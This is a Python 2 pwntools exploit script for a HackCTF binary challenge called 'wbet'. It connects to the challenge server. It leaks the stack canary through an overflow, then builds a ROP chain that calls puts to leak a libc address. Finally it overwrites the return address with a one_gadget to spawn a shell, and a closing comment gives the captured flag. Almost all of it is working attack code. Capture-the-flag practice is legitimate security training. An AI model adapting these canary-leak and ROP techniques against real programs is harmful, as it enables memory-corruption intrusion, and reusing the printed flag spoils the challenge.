# python2

from pwn import * 
context.local
local = 0

if local == 0 : 
    p = remote("ctf.j0n9hyun.xyz",3027) #16.04
    printf_got = 0x601040 #setvbuf
    printf_offset = 0x6fe70 #setvbuf
    #in remote , using printf inst work. 
    one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
    
else : 
    p = process("./wbet")    
    printf_got = 0x601030
    printf_offset = 0x64e80        
    one_gadget = [0x4f2c5,0x4f322,0x10a38c]
    
prr = 0x4008e3 # pop rdi ; ret
main = 0x400727


puts_plt = 0x4005e0




#64bit, canary on, pie off, relro partial.
#seems like carary leak - rop - one gadget.
#canary on rbp - 8

#first, leak canary and restart input. 
payload = "a"*0x32 + "b"*7

p.sendlineafter("Your text)",payload)
p.recvuntil("b"*7)
can = u64('\x00'+p.recv(7))
log.info(hex(can))

sleep(0.4)

p.sendlineafter("Yes/No)","Yes")


#payload2 = p64(puts_got) + p64(puts_plt)
#context.log_level = 'debug'
payload2 = "a"*0x38 + p64(can) + "b"*8*7 + p64(can) + "c"*8 
payload2 += p64(prr) + p64(printf_got) + p64(puts_plt) + p64(main)

p.sendlineafter("Your text)",payload2)
p.sendlineafter("Yes/No)","No")

print p.recvline()

leak = p.recvline()[:-1]
leak = u64(leak+"\x00"*(8-len(leak)))
libc = leak - printf_offset
log.info("leak : "+hex(leak)+"  libc : "+hex(libc))

one = libc + one_gadget[0]

payload3 = "a"*0x38 + p64(can) + "b"*8*7 + p64(can) + "c"*8
payload3 += p64(one)

pause()

p.sendlineafter("Your text)",payload3)
p.sendlineafter("Yes/No)","No")

p.interactive()

#HackCTF{I_th0ught_X0R_is_the_w0rld_b3st_Encrypti0n}